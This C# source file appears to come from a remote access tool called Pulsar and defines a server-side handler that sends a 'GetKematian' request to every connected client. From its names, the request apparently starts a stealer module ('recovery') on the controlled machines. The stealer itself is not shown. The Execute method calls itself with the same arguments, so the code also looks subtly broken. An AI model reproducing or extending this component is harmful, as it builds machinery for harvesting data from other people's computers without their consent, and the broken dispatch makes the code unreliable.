using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using DarkModeForms;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.Kematian;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;

namespace Pulsar.Server.Kematian
{
    public class KematianHandler : MessageProcessorBase<object>
    {
        private readonly Client[] _clients;

        public KematianHandler(Client[] clients) : base(true)
        {
            _clients = clients;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is GetKematian;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _clients.Any(c => c.Equals(sender));

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKematian pass:
                    Execute(sender, pass);
                    break;
            }
        }

        public void BeginRecovery()
        {
            var req = new GetKematian();
            foreach (var client in _clients.Where(client => client != null))
            {
                client.Send(req);
            }
        }
    }
}
